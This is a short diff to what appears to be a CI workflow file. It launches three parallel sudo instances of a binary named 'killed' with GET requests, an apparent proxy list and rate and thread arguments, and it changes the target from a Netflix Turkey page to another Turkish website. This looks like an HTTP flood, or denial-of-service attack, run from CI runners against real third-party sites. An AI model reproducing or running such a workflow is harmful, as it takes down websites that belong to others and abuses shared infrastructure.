@@ -18,7 +18,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..3}; do
-            sudo timeout 30 ./killed GET https://www.netflix.com/tr/ fres.txt 30 999 8 &
+            sudo timeout 30 ./killed GET https://antifix.com.tr/ fres.txt 30 999 8 &
             PIDS+=($!)
           done
           
